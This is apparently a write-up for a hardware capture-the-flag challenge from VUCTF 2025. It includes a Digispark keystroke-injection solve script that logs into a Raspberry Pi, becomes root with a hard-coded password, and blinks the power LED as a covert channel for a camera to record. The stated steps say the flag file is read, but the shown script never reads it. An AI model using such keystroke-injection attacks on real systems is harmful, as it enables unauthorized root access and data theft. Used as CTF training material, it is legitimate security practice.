## Hard hardware
This is the hard hardware challenge part of the hardware challenge series during VUCTF 2025. 

**Target system**
- Raspberry pi os lite (64 bit) no desktop (2025-05-04)
- Raspberry pi 4B


The players needs to:
1. Write a script onto the digispark which will read the flag file and blink the leds of the raspberry pi
2. Capture the led blinks through the pwned IP camera. 
3. Read the capture and extract the flag

Script to do this
```c
// login
vuctf
vuctf

// get to root
sudo su

// change led brightness to max
echo 255 > /sys/class/leds/PWR/brightness

// change led brightness to min/off
echo 0 > /sys/class/leds/PWR/brightness


```


### Solve script
```c
#include "DigiKeyboard.h"

void setup() {
  // empty setup
}

void send_keys(const char* command) {
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(command);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // login to the tty 
  send_keys("vuctf");
  send_keys("vuctf");

  send_keys("sudo su");
  send_keys("studsec_VUctf_2025_H3rdw4re");
    
  send_keys("echo 255 > /sys/class/leds/PWR/brightness");
  send_keys("echo 0 > /sys/class/leds/PWR/brightness");
  send_keys("echo 255 > /sys/class/leds/PWR/brightness");
  send_keys("echo 0 > /sys/class/leds/PWR/brightness");
  send_keys("echo 255 > /sys/class/leds/PWR/brightness");
  send_keys("echo 0 > /sys/class/leds/PWR/brightness");
  send_keys("echo 255 > /sys/class/leds/PWR/brightness");
  send_keys("echo 0 > /sys/class/leds/PWR/brightness");
  send_keys("echo 255 > /sys/class/leds/PWR/brightness");

  // logout to apply changes
  send_keys("exit");
  send_keys("logout");

  // Infinite loop to stop execution
  for (;;) { /* empty loop */ }
}

```